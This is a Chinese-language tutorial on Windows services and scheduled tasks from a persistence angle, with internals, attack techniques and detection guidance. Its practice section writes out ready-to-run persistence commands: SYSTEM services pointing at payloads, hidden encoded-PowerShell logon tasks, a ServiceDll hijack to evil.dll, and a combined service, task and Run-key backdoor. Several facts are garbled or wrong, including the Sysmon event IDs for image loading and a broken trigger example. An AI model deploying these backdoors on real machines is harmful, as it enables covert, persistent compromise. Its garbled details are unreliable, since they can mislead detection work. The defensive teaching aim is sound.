## 1. 概述

在 Windows 系统中，"服务（Windows Service）"与"计划任务（Scheduled Task）"是两种最古老、也最常用的后台自动运行机制。它们在攻防实战中被赋予了双重身份：一方面它们是系统正常运行的基础设施（如 DNS 客户端服务、打印后台服务、系统更新任务）；另一方面，由于它们拥有**系统级隐藏性**与**高权限运行**两大特性，成为攻击者在内网渗透中实现持久化（Persistence）、权限维持（Privilege Escalation）与横向移动（Lateral Movement）的"首选门面"。

从威胁模型（Threat Model）角度看，本文聚焦的"持久化视角"回答三个问题：

1. **机制**：服务与计划任务在系统内部到底如何运作？（SCM 如何管理服务？任务计划程序如何处理 XML 与触发器？）
2. **利用**：攻击者具体如何把它们变成后门？（服务创建、DLL 劫持、未加引号路径、隐藏任务注册）
3. **防御**：蓝队如何发现这些后门？（Sysmon、Windows 安全日志、Autoruns、注册表巡检）

本文为**主攻级（Primary Level）**文章，面向具备一定 Windows 基础、希望深入理解"服务/计划任务"攻防机理的读者。阅读前置知识建议：熟悉命令提示符与 PowerShell 基础、理解进程与注册表概念、了解 Windows 事件日志的查看方式。

## 2. 核心原理

### 2.1 服务控制管理器（Service Control Manager，SCM）

SCM 是 Windows 内核外围的一个特殊进程（`services.exe`），负责协调服务生命周期的一切事务。它维护一个数据库，即**服务控制数据库（SCM Database）**。在这个数据库中，每个服务至少拥有如下属性：

- **服务名称（Service Name）**：唯一的内部标识，SCM 借此进行控制操作。
- **显示名称（Display Name）**：面向用户的友好名称，可重复、可伪装。
- **二进制路径（Binary Path / ImagePath）**：可执行文件或 `svchost.exe` 宿主加参数的启动命令行。
- **服务类型（Service Type）**：`SERVICE_WIN32_OWN_PROCESS`（独占进程）、`SERVICE_WIN32_SHARE_PROCESS`（共享进程）、`SERVICE_KERNEL_DRIVER`（内核驱动）等。
- **启动类型（Start Type）**：`SERVICE_BOOT_START`、`SERVICE_SYSTEM_START`、`SERVICE_AUTO_START`（自动）、`SERVICE_DEMAND_START`（手动）、`SERVICE_DISABLED`（禁用）。
- **服务账户（Service Account）**：`LocalSystem`、`LocalService`、`NetworkService` 或自定义域账户。

注册表层面的服务配置位于 `HKLM\SYSTEM\CurrentControlSet\Services\<服务名>` 键下，其中 `ImagePath`、`Type`、`Start`、`ObjectName`（账户）分别对应上述属性。这一注册表位置既是服务机制的真实存储，也是攻击者落地的关键"持久化驻点（Persistence Point）"。

### 2.2 服务进程的三方协作模型

一个服务的运行由三方协作完成：

1. **SCM（services.exe）**：负责读取配置、发送控制码（Start/Stop/Pause/Continue）、维护状态机。
2. **服务进程（Service Host）**：执行服务主体代码。现代多数服务被设计为 **DLL 型服务**，由 `svchost.exe`（Service Host Process，服务宿主进程）动态加载承载。
3. **服务程序自身（Service Main / Handler）**：实现 `ServiceMain` 入口函数（负责初始化为 SCM 接受的 `SERVICE_RUNNING` 状态）与 `Service Control Handler`（处理来自 SCM 的控制请求）。

三者之间的状态交互可用以下 ASCII 图表示：

```
                 注册表: HKLM\SYSTEM\CurrentControlSet\Services\<svc>
                                   |
                                   v
        +---------------------------------------------+
        |      services.exe  (Service Control Manager)|
        |  - 读取配置(ImagePath/Start/ObjectName)      |
        |  - 校验服务状态机(READY->STARTING->RUNNING)  |
        |  - 维护 SCM Database                        |
        +---------------------------------------------+
            |  CreateProcess() / 服务启动命令        |
            v                                        |
   +----------------------------------+              |
   |  svchost.exe -k 服务组名           |  <----------+
   |  (Service Host Process/宿主进程)   |
   |      +--------------------------+ |
   |      | ServiceMain 初始启动段     | | 调用 DLL 的
   |      +--------------------------+ | ServiceMain
   |      | Service Control Handler  | | 回报状态
   |      | (HandlerEx 回调)          | | 到 SCM
   |      +--------------------------+ |
   +--------------+-------------------+
                  |
                  | StartServiceCtrlDispatcher() 建立与 SCM 的通信管道
                  v
        SCM 收到 SERVICE_RUNNING 状态，对外显示"正在运行"
```

启动流程大致为：SCM 读取服务键 → 创建进程并传入 `ServiceMain` 参数 → 服务进程调用 `StartServiceCtrlDispatcher` 注册调度器 → 完成初始化后调用 `SetServiceStatus(..., SERVICE_START_PENDING)` → 最后报告 `SERVICE_RUNNING`。

### 2.3 计划任务（Scheduled Task）的运行模型

任务计划程序由服务 `Schedule`（`svchost` 承载）与 `taskschd.msc`（管理 GUI）构成，任务定义全部存储在 `%SystemRoot%\System32\Tasks\` 目录的 **XML 文件**中（注册表 `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache` 为索引与状态缓存）。一个任务 XML 的核心元素包括：

- **注册信息（RegistrationInfo）**：作者、描述、注册时间。
- **触发器（Triggers）**：如 `TimeTrigger`（定时）、`LogonTrigger`（登录时）、`BootTrigger`（系统启动时）、`CalendarTrigger`、`EventTrigger`（事件触发）。
- **主体（Principal）**：运行身份（`UserId`）、`LogonType`（交互/密码/S4U/服务）、`RunLevel`（是否以最高权限运行，对应"以管理员身份运行"）。
- **设置（Settings）**：`Hidden`（隐藏任务）、失败重试、电源条件、`RunOnlyIfNetworkAvailable` 等。
- **操作（Actions）**：`ExecAction`（执行程序，支持参数与工作目录）、`ComHandler`（COM 处理器，可指向任意 COM 类）、`SendEmailAction`/`ShowMessageAction`。

尤其值得注意的是 **任务 SID（Task SID）**：每个非交互任务会被授予一个唯一的任务服务 SID，用于对资源进行最小权限授权；而 `RunLevel="HighestAvailable"` 配合 `S4U`（Service for User）登录类型，可以让任务在无明文密码的情况下以高权限执行，这也常被攻击者利用来"免静默提权"。

### 2.4 威胁建模：为什么它们成为持久化首选

在渗透测试与红队演练中，衡量一种持久化手法的价值，通常看四个维度：**隐蔽性（Stealth）**、**权限高度（Privilege）**、**稳定度（Resilience）**与**可控性（Control）**。服务与计划任务恰好在这四个维度上全面占优：

- **隐蔽性**：服务与任务是 Windows 的原生机制，深藏在系统目录与注册表中，普通用户不会逐一核查；攻击者只需把显示名起得贴近 `Microsoft`、`Windows Update`、`Security Center` 等字样，过滤条件不严格的安全产品很容易放过。
- **权限高度**：服务默认可用 `LocalSystem`（本地系统账户）运行，天然获得系统最高权限；计划任务可用 `HighestAvaable` 运行级别配合 S4U 登录类型，在不需要明文密码的情况下实现提权运行。
- **稳定度**：服务具备故障重启（FailureActions）机制，计划任务则有重复触发与启动延迟配置，两者都能在进程被杀死后自动复活，远比单一的注册表 Run 键（仅登录触发一次）可靠。
- **可控性**：攻击者可以通过 `sc start/stop`、`schtasks /run` 等标准接口随时启停后门，无需依赖自定义的控制通道，降低了被网络层探测发现的概率。

与之对比，修改注册表 Run/RunOnce 只会随登录执行一次，容易被清理；修改计划任务虽然有类似问题，但配合 `OnStart`、`OnLogon` 与事件触发后可达"只存活数秒、触发即执行"的极隐蔽状态。因此，**在大型攻防演练中，80% 以上的自动化后门都选择服务或计划任务作为落地载体**，这也就是本文强调"持久化视角"的根本原因。

## 3. 详细知识点

### 3.1 服务类型（Service Type）与服务启动方式

Windows 服务的类型决定了它的进程模型，这是攻防双方都必须精确掌握的第一层知识：

| 服务类型 | 十六进制（TYPE） | 进程模型 | 持久化特点 |
|---|---|---|---|
| `SERVICE_WIN32_OWN_PROCESS` | `0x10` | 每个服务独占一个进程（常由 Trace 程序自身承载） | 替换 ImagePath 二进制即被调用 |
| `SERVICE_WIN32_SHARE_PROCESS` | `0x20` | 多个服务共享同一 `svchost.exe` 宿主，按服务组分类 | 需配合 `ServiceDll` 实现 DLL 型服务劫持 |
| `SERVICE_KERNEL_DRIVER` | `0x01` | 内核驱动，被 `ntoskrnl.exe` 加载 | 驱动加载即提权到内核，风险极高 |
| `SERVICE_FILE_SYSTEM_DRIVER` | `0x02` | 文件系统驱动 | 同上 |

服务启动方面，系统按以下阶段加载自动服务：内核（Boot Start）→ Session Manager（System Start）→ 自动启动服务（Auto Start）→ 手动服务按需启动。掌握启动顺序，有助于分析恶意服务何时被调用、其在系统启动链路上的作用点。

### 3.2 SCM 与服务的通信：SERVICE_STATUS 结构与控制流程

服务程序通过 `StartServiceCtrlDispatcher` 把自己注册进 SCM 的调度循环，之后所有控制请求都会经 SCM 转发给服务进程。状态信息结构体 `SERVICE_STATUS`（及其扩展 `SERVICE_STATUS_PROCESS`）包含：

- **dwServiceType**：服务类型。
- **dwCurrentState**：当前状态（`SERVICE_STOPPED`、`SERVICE_START_PENDING`、`SERVICE_STOP_PENDING`、`SERVICE_RUNNING`、`SERVICE_PAUSED` 等）。
- **dwControlsAccepted**：该服务接受哪些控制码（`SERVICE_ACCEPT_STOP`、`SERVICE_ACCEPT_SHUTDOWN` 等）。
- **dwWin32ExitCode** 与 **dwServiceSpecificExitCode**：退出码。
- **dwCheckPoint / dwWaitHint**：启动/停止挂起时的进度信号与超时提示。

控制码（Control Codes）由 `ControlService` 或 `sc control` 下发，常见如 `SERVICE_CONTROL_STOP`（0x01）、`SERVICE_CONTROL_PAUSE`（0x02）、`SERVICE_CONTROL_SHUTDOWN`（0x05）、`SERVICE_CONTROL_PARAMCHANGE`（0x06）。理解这一套状态机，能帮助防御者判断：服务"看似正在运行但实际并未就绪"或"挂起"的异常场景可能意味着恶意服务初始化失败或正在等待外联。

### 3.3 svchost 共享进程模型与 DLL 型服务（图像加载的检测意义）

`svchost.exe`（Service Host Process，服务宿主进程）是 32 位/64 位系统后台服务的通用宿主。它通过 `-k` 参数指定**服务组（Service Group）**，SCM 依据 `HKLM\...\Services\<svc>\Parameters\ServiceDll` 中的 DLL 路径加载每个服务的主体代码。这种设计带来的攻防要点：

- **效率 vs 攻击面**：共享进程减少了资源占用，但也意味着"一个进程崩溃影响同组多个服务"，且恶意 DLL 注入宿主后可与同组服务共享内存。
- **svchost 二进制伪装**：手写恶意服务若直接以 `svchost.exe` 形象出现，Security Operations Center（SOC，安全运营中心）分析师容易误判。
- **检测意义**：加载 DLL 的行为会触发**Sysmon EventID 6（镜像加载 / Image Loaded）**与 EventID 7（模块加载）。当异常的 `svchost.exe` 进程加载了位于用户目录、临时目录的 DLL 时，即为高度可疑的**DLL 劫持（DLL Hijacking）/侧载（DLL Sideloading）**信号。

### 3.4 计划任务：XML 结构、触发器与应用场景

计划任务的核心是 Tasks 目录下的 XML。以 `LogonTrigger` 为例，攻击者常注册一个 `RunLevel` 为最高权限、`UserId` 指向 SYSTEM 的任务，当某用户登录时自动启动 `cmd.exe /c ...` 或 PowerShell 回连。常见攻击姿势对比：

| 持久化手段 | 触发方式 | 权限 | 落地特征 |
|---|---|---|---|
| `OnStart` 任务 | 系统启动 | SYSTEM | 任务 CPU 时间极少、无交互窗口 |
| `OnLogon` 任务 | 用户登录 | 用户/最高 | 与登录时段强相关 |
| `OnEvent` 任务 | 基于 WMI 或日志事件 | 可自选 | 与特定事件 ID（如 4624 登录成功）深度耦合 |
| COM 处理器任务（`ComHandler`） | 任意触发 | 取决于主体 | 指向非标准 CLSID，隐蔽性极高 |

对防御者而言，任务隐藏（`Hidden` 属性为 true）不意味着任务计划程序 GUI 中绝对不可见；通过 `schtasks /query /v /fo LIST` 或 PowerShell `Get-ScheduledTask` 仍能枚举全部任务，包括隐藏项。

### 3.5 权限体系：服务账户、登录类型与任务 SID

- **服务账户**：`LocalSystem`（本地系统，权限最高、可访问网络凭据）、`LocalService`（本地服务，最小网络权限）、`NetworkService`（网络服务，可出网）、自定义账户（明文密码存储在 SCM，为 LastPass 类密码抓取目标）。
- **任务登录类型（LogonType）**：`InteractiveToken`（交互令牌）、`Password`（密码登录）、`S4U`（Service for User，无需明文密码即可获得网络/交互令牌，`RunLevel` 可抬到最高权限）、`ServiceAccount`。
- **任务 SID（Task SID）**：系统为任务创建的受限身份；`Get-ScheduledTask` 可通过 `Principal.Id` 查看。攻击者若以 SYSTEM 运行任务，则任务 SID 直接映射到高权限主体，审计时需格外关注 `RunLevel=HighestAvailable` 的任务。

### 3.6 持久化落地位置与注册表驻点

服务与计划任务相关的持久化数据点总结（可作为巡检清单）：

- `HKLM\SYSTEM\CurrentControlSet\Services\` → 服务键（`ImagePath`/`DependOnService`/`Parameters\ServiceDll`）。
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\` → 任务索引与状态。
- `%SystemRoot%\System32\Tasks\` → 任务 XML 本体。
- `HKLM\SYSTEM\CurrentControlSet\Services\svchost` 的 `-k` 组映射表（组名 → 服务列表）。

任何出现在上述位置、且名称雷同于合法系统组件（如含 `Microsoft`、`Windows`、`Update`、`Security` 字样）的注册项，都应在应急响应时优先核实其时间戳、签名与指向路径。

### 3.7 服务故障恢复（FailureActions）与自复活机制

绝大多数安全人员关注的是"服务如何被创建"，却忽略了系统给服务提供的**故障自愈（Failure Recovery）**功能。在注册表 `HKLM\SYSTEM\CurrentControlSet\Services\<svc>` 键下，`FailureActions`（类型 `REG_BINARY`/`REG_NONE`）定义了服务意外终止后 SCM 的动作序列：**重启服务（Restart）→ 重启计算机（Reboot）→ 运行指定程序（Run Command）**，以及每一步的重试间隔与最长重置时间。

攻击者的典型利用：

1. 把"回到连程序"直接指定为故障恢复命令，即使进程被本地管理员杀掉，SCM 也会按设定时间自动拉回。
2. 将恶意服务伪装成"系统服务崩溃后自愈"的合法外观，令应急人员误以为是正常的故障恢复日志。
3. 配合延迟启动（`SERVICE_DELAYED_AUTO_START_INFO`），把恶意代码执行推迟到系统启动负载高峰之后，规避启动阶段的沙箱监控。

防御者应把 `FailureActions` 值纳入服务基线：正常系统服务的恢复策略几乎总是"重启服务"或"无操作"，凡是出现"运行 cmd.exe / powershell"等命令型恢复策略的服务，几乎可以断定是被持久化的信号。

### 3.8 服务的依赖与团体（Dependencies / Service Groups）

- **服务依赖（Dependencies）**：服务键下的 `DependOnService` 声明了该服务依赖的前置服务，前置服务未就绪则本服务不会启动。攻击者可利用依赖关系让恶意服务"跟在某个合法服务之后"启动，让事件时间线看起来正常；也可故意让恶意服务成为某合法服务的前置，从而阻止外部工具分析依赖链。
- **服务组（Service Groups）**：`svchost` 的 `-k` 参数对应 `HKLM\SYSTEM\CurrentControlSet\Control\Services` 下的组定义（如 `netsvcs` 组承载数百个网络相关服务）。新增的服务若把启动组指定为 `netsvcs`，会随 `svchost.exe -k netsvcs` 一起被拉起，进一步融入"正常"的系统行为外观。排查时，`sc qc` 输出中的 `SERVICE_START_NAME` 与 `svchost -k` 组是否匹配，是很有效的对照线索。

### 3.9 计划任务的高级驱动：事件订阅与 COM 处理器

除了时间与登录触发，计划任务的隐蔽性天花板来自两类高级触发器：

- **事件触发器（EventTrigger）**：绑定 WMI 查询，例如 5145. Throttle 过滤。攻击者将其绑定到登录成功事件（EventID 4624）、新进程创建、甚至是 RDP 会话建立等日常高频事件，让后门执行与合法操作"同频共振"，时间维度上几乎无法与正常流量区分。
- **COM 处理器（ComHandler Action）**：任务的动作可以不指向可执行文件，而是实例化一个 COM 对象（`<Task xmlns="..."><Actions><Exec>...` 的替代是 `<ComHandler><ClassId>...</ClassId></ComHandler>`）。恶意 payload 被封装进 `In-Process COM` 服务器 DLL，由任务计划程序以任务主体身份加载执行。由于启动方式不再是"创建进程"，父进程链与命令行审计往往失效，只有 Sysmon EventID 10（进程访问）与 6（镜像加载）才能捕捉到痕迹。

理解这两类高级触发方式，能帮助防守方在分析计划任务时跳出"只看 Action 命令行"的局限，转而检查任务的 `Triggers/XML` 全量字段。

## 4. 实战与示例

### 4.1 创建持久化服务：sc.exe 与 PowerShell

```powershell
# 使用 sc.exe 创建一个以 SYSTEM 运行的持久化服务
sc.exe create "UpdateSvcHelper" binPath= "C:\Windows\Temp\payload.exe" start= auto obj= LocalSystem
sc.exe start UpdateSvcHelper

# 更常见的"伪装合法显示名"写法
sc.exe create "Microsoft Windows Update Agent" `
  binPath= "\"C:\Program Files\Common Files\System\updagent.exe\" -svc" `
  displayname= "Microsoft Windows Update Agent" start= auto

# PowerShell 等价写法
New-Service -Name "UpdateSvcHelper" `
  -BinaryPathName "C:\Windows\Temp\payload.exe" `
  -DisplayName "Update Service Helper" `
  -StartupType Automatic

# 枚举与核实（防御视角的对应命令）
sc.exe qc UpdateSvcHelper          # 查询服务配置
sc.exe query state= all            # 枚举全部服务
Get-Service -Name "UpdateSvcHelper"
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\UpdateSvcHelper"
```

### 4.2 DLL 劫持与未加引号服务路径（Unquoted Service Path）

未加引号路径的原理解读：`ImagePath` 若为 `C:\Program Files\Vendor\Tool\Svc.exe` 且未加引号，SCM 启动时会按空格拆分依次尝试 `C:\Program.exe`、`C:\Program Files\Vendor\Tool\Svc.exe` 等。攻击者在中间目录（如 `C:\Program Files\Vendor\`）放下 `Tool` 或伪造文件即可实现"同名文件劫持"。

```powershell
# 1) 发现存在未加引号服务路径的目标服务
wmic service get name,displayname,pathname | findstr /i /v "C:\Windows" | findstr /i /v """"

# 2) 手工核对
sc.exe qc <疑点服务>

# 3) 若路径目录可写，放置同名可执行文件后重启服务
copy payload.exe "C:\Program Files\Vendor\Svc.exe"   # 仅当目录可写且原文件可控
```

DLL 侧载则更隐蔽：把恶意 DLL 改名成合法服务进程所依赖的 DLL 名（如 `version.dll`、`winmm.dll`、`dxgi.dll`），放进服务二进制所在目录，重点观察 Sysmon EventID 6 中"非系统目录 DLL 被服务进程加载"的记录。

### 4.3 计划任务持久化：schtasks 与 Register-ScheduledTask

```powershell
# 经典回连任务：用户登录时以最高权限执行 PowerShell
schtasks.exe /Create /TN "\Microsoft\Windows\Update\SyncAgent" `
  /SC ONLOGON /RL HIGHEST /RU SYSTEM `
  /TR "powershell.exe -nop -w hidden -enc <BASE64>" /F

# PowerShell 现代化写法（包含 XML 级控制）
$action  = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-enc <BASE64>"
$trigger = New-ScheduledTaskTrigger -AtLogOn -RandomDelay (New-TimeSpan -Minutes 3)
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest -LogonType ServiceAccount
Register-ScheduledTask -TaskName "\Microsoft\Windows\Update\SyncAgent" `
  -Action $action -Trigger $trigger -Principal $principal -Force

# 防御侧枚举（无论是否隐藏）
Get-ScheduledTask | Where-Object { $_.TaskPath -notlike "\Microsoft\*" } | Format-Table
schtasks.exe /query /tn "\Microsoft\Windows\Update\SyncAgent" /v /fo LIST
```

事件触发型任务通常借助 `wevtutil` 或 `Get-WinEvent` 确认触发器；排查时重点核对 `Principal.UserId`、`Principal.LogonType` 与 `TrustedInstaller`/SYSTEM 身份的匹配关系。

### 4.4 蓝队核查：Sysmon、安全日志与 Autoruns

```powershell
# Sysmon: 服务进程加载可疑 DLL(Image Loaded)
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; Id=6} |
  Where-Object { $_.Message -match 'C:\\Users|Temp|Public' }

# 安全日志: 服务安装事件 4697 与 7045(System)
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4697} -MaxEvents 50 |
  Select-Object TimeCreated, Message
Get-WinEvent -FilterHashtable @{LogName='System'; Id=7045} -MaxEvents 50

# Autoruns(需 Sysinternals, 管理员运行)输出到 CSV 供分析
.\autorunsc64.exe -a s -c > services.csv      # -a s 仅服务
.\autorunsc64.exe -a * -m -c -h > all.csv     # 全部含隐藏项
```

关键判别规则：新增服务若出现 `4697`（账户已注册服务）/`7045`（新服务已安装）事件，需人工核实 ImagePath 是否位于 Temp、Users、Public 目录，或是否带 `-enc`/`-w hidden` 等可疑参数。

### 4.5 横向移动关联：计划任务 / 服务方式在域内的落地

- **PsExec / Remote Service**：通过 SMB 的 `\\host\ADMIN$` 上传服务二进制并远程创建服务，触发后自删。检测：`7045`/`4697` 新服务 + File Creation Time 异常。
- **WMI 计划任务 / `schtasks /s`**：通过 `schtasks /create /s <target>` 在远程主机注册任务，配合 `S4U` 高权限执行。检测：目标机 `EventID 106`（任务注册于远程主机的时间点）+ 4624 类型 3 网络登录。
- **Mimikatz 的 `kerberos::asktgt` 与 SCM 滥用**：拥有账户凭据后 `sc.exe \\target create` 即可横移，因此在域环境中对所有高权限服务/任务的集中审计尤其重要。

### 4.6 服务型 DLL 注入的观测与反制（攻防双方视角）

```powershell
# 攻击视角：把恶意 DLL 注册为一个共享进程服务(等价于 svchost 承载)
sc.exe create "SvcNetHelper" `
  binPath= "C:\Windows\System32\svchost.exe -k netsvcs" `
  type= share start= demand obj= LocalSystem
# 然后在下列注册表写上 ServiceDll 指向攻击者 DLL(高权限注册表操作)
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SvcNetHelper\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "C:\Temp\evil.dll"

# 防御视角：枚举全部服务的 ServiceDll, 找出异常路径
Get-ChildItem "HKLM:\SYSTEM\CurrentControlSet\Services\*" |
  ForEach-Object {
    $dll = (Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue).ServiceDll
    if ($dll -and $dll -notmatch '^C:\Windows\\') { "$($_.PSChildName)`t$dll" }
  }
```

观测要点：一旦恶意服务启动，`svchost.exe -k netsvcs` 会加载非系统目录 DLL，**Sysmon EventID 6** 会立即留痕；且由于加载发生在服务进程，**MOTW（Mark of the Web，网络标记）**与文件数字签名均可作为快速过滤条件。

### 4.7 一条命令的"服务 + 任务 + 注册表"三重后门演练

下面的演示把三种经典持久化技法组合成一套"杀不死"的后门（仅限授权靶机）：

```powershell
# 1) 服务：以 LocalSystem 启动回连载荷
sc.exe create "WdmFilterIO" binPath= "C:\ProgramData\drvflt.exe -k" start= auto obj= LocalSystem

# 2) 计划任务：每 30 分钟或登录时二次回连, 与服务形成双活
$act  = New-ScheduledTaskAction -Execute "C:\ProgramData\drvflt.exe" -Argument "-respawn"
$trg1 = New-ScheduledTaskTrigger -Once -At (Get-Date) `
          -RepetitionInterval (New-TimeSpan -Minutes 30)
$trg2 = New-ScheduledTaskTrigger -AtLogOn
Register-ScheduledTask -TaskName "MSVCtlRebuild" -Action $act `
          -Trigger $trg1,$trg2 -Principal (New-ScheduledTaskPrincipal -UserId SYSTEM -RunLevel Highest) -Force

# 3) 注册表兜底: 下次登录时再拉一遍
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
          -Name "RuntimeBroker32" -Value "C:\ProgramData\drvflt.exe" -Force
```

实战要警惕的是：这种三重叠加会让应急响应陷入"清除一处、短时复发"的拉锯。正确的清剿顺序应为：先杀进程与断网 → 再删计划任务与服务键 → 最后清理 Run 键与工作目录文件 → 随后持续监控 4624/4697/4698 与 Sysmon 事件数小时，确认无再生。

### 4.8 域环境下基于组策略的任务下发与排查

在企业环境中，管理员会通过**组策略（Group Policy Object，GPO）**批量下发计划任务（`Computer Configuration\Preferences\Control Panel Settings\Scheduled Tasks`）。攻击者一旦拿到域管理员，往往会"复用通道"而不是自己动手注册：

- 在原始 GPO 中追加恶意任务，使后门随下一次组策略刷新（默认 90 分钟）自动落地到所有客户机。
- 排查要点：核对 GPO 任务与 `gpedit` 项的作者、修改时间；对比相同 GPO 在另一台参考机的 `Tasks` 目录哈希；用 `gpresult /h` 导出应用结果，核查计划任务来源是否为已签名 GPO。

这种"借官方下发管道"的手法，其检测价值不在单台主机，而在**域控审计日志（Microsoft-Windows-GroupPolicy/Operational，EventID 1200/1201）与 GPO 版本号突变**，蓝队务必把"GPO 变更审计"纳入域核心监控项。

## 5. 常见坑与避坑指南

1. **引号坑（Unquoted Path 误修复）**：运维用 `sc config` 修改路径时忘记给带空格的路径加引号，可能反而"制造"出可利用的未加引号路径。**对策**：任何含空格的 `ImagePath` 必须整体加双引号；巡检时对所有未加引号的服务列表建立基线。
2. **权限边界误判**：`Get-Service`/`sc query` 显示"运行中"不代表服务初始化完成，`SERVICE_START_PENDING` 挂起可能意味着恶意初始化代码正在等待网络/文件。**对策**：用 `sc.exe queryex` 查看 `CheckPoint` 与 `WaitHint`，必要时抓取进程启动参数。
3. **svchost 误报与漏报**：共享进程加载的模块数量多，直接按镜像文件判断易误报；而"关闭全部共享进程"又容易误伤。**对策**：结合 `svchost -k` 组名、`ServiceDll` 与实际加载路径三方对照，而非只看进程名。
4. **隐藏任务的"看不见"**：`Hidden` 任务默认不出现在 MMC 列表，但 `schtasks /query /v` 与 `Get-ScheduledTask -All` 可见。**对策**：巡检一律使用 `-All`/`/v`；警惕"看似是 Microsoft 路径、实际 TaskPath 为反斜杠伪装的根路径任务"。
5. **清除后重生**：仅删除服务键或任务 XML，而未删除二进制本体、未清理自带的服务重启保护逻辑，攻击者可通过 `svc` 的 `FailureActions`（故障自动重启）或任务触发器再次拉起。**对策**：删除服务/任务的同时验证 `FailureActions`、`ImagePath` 关联文件与父进程链，并恢复注册表与文件删除两条线。
6. **日志时间线漂移**：7045 事件的 `TimeCreated` 不一定等于恶意二进制写入时间；攻击者常用 `timestomp` 打点。**对策**：综合 PowerShell 操作历史（脚本块日志 EventID 4104）、Sysmon EventID 1/6/11 的跨卷时间线交叉比对。
7. **计划任务触发器依赖遗漏**：仅审查"现在运行的任务"会漏掉 `AtStartup`+延迟、`OneTime` 已过去的任务。**对策**：`Get-ScheduledTaskInfo` 查 `LastRunTime`/`NextRunTime`，结合触发器 XML 全量复查。
8. **账户令牌与 S4U 的误解**：任务 `LogonType=S4U` 不落明文密码，但并不意味着免认证；攻击者常配合已窃取的 Kerberos 票据（`kekeo`/`Rubeus` 注入）实现"无形"高权限执行。**对策**：账户基线中对比任务的 `Principal.LogonType` 变化，S4U 任务若指向非系统 DLL 需立即升级处置。
9. **PowerShell 操作历史与日志丢失**：仅依赖 `#requires` 与执行策略会漏掉 `-enc` 编码载荷；而攻击者可在删除前先清空 `Microsoft-Windows-PowerShell/Operational`。**对策**：开启**脚本块日志（Script Block Logging，EventID 4104）**与**转录（Transcription）**，并落地到集中日志平台实现异地留存。
10. **"看起来正常"的路径陷阱**：`C:\Program Files\` 目录对普通用户可写度因 NTFS ACL 而异，但 `C:\Program Files (x86)\`、`ProgramData` 子目录常见弱权限；攻击者选的服务路径可能并非系统目录而是"包装成系统目录"。**对策**：用 `icacls`/`accesschk` 对服务 ImagePath 所在的父目录做 ACL 基线扫描，重点标记 `Authenticated Users` 与 `Everyone` 可写项。

## 6. 知识关联

- **持久化技法映射**：本文服务持久化对应 ATT&CK **T1543.003（Create or Modify System Process：Windows Service）**；任务持久化对应 **T1053.005（Scheduled Task）**。横向移动侧关联 **T1021.001（Remote Services：SMB/Admin Shares）** 与 **T1037（Boot or Logon Initialization Scripts）** 的相近手法。
- **权限提升**：未加引号路径与可写目录可写文件属于 **T1574.009（Hijack Execution Flow：Path Interception by Unquoted Path）**；DLL 侧载/劫持属 **T1574.001/002**。这些都是从"低权限服务"到"System"的经典提升路径。
- **检测与防御**：与 Sysmon 配置（EventID 1 进程创建、6 镜像加载、11 文件创建、13 注册表设置、17/18 管道与事件）、Windows 安全审核（4697/7045/4698 任务注册、4699 任务删除）联动；结合 **Autoruns**（Sysinternals）与 **Sysinternals Process Explorer** 做进程树还原。
- **交叉主题**：本文的注册表驻点与《Windows 注册表与自启动项》笔记互为上下游；授权与账户主题衔接《Windows 账户与权限》笔记；域内横向部分衔接《内网横移动态》及 Kerberos 相关笔记。
- **攻击视角扩展**：可将服务/任务封装为"服务化 C2 载体"，即用计划任务心跳拉取指令、服务保活 C2 载荷，这也是高级可持续性威胁（Advanced Persistent Threat，APT）常见组合。
